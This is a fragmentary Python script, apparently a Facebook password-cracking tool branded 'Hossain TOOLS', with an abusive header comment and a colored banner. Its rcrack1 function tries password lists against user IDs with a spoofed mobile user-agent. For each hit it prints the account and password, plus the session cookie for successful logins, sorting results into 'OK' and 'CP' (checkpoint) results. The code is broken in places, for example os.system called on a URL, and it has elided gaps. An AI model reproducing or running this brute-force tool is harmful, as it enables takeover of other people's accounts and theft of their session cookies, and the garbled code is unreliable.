...
#Fuck hossain vai 
#Dec By Hossain
#Hossain Your Reyal Pappa
#Hossain Kids Numbar 5
...
\033[1;91m\033[1;41m\033[1;97m              WELCOME TO Hossain TOOLS               \033[;0m\033[1;91m\033[1;92m

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] TOOLS TYPE:\033[1;32m FREED
\033[1;32m[-] AUTHOR    :\033[1;32m Hossain vai
\033[1;32m[-] GITHUB    :\033[1;32m ROMAN-XXX
\033[1;32m[-] FACEBOOK  :\033[1;32m FH hossain
\033[1;92m══════════════════════════════════════════

\033[1;91m<═══\033[1;41m\033[1;97m THIS NAME IS Hossain BRAND\033[;0m\033[1;91m═══>\033[1;92m""")
...
class Main:
    def __init__(self):
        ...
        self.cp = []
        self.loop = 0
        os.system("https://www.facebook.com/profile.php?id=100092174587959")
        print(logo)
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mHossain\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[Hossain-OK🌻] {uid}|{ps}")
                print(f"\n[COOKIE🎁] : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[Hossain-CP❌] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[Hossain-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
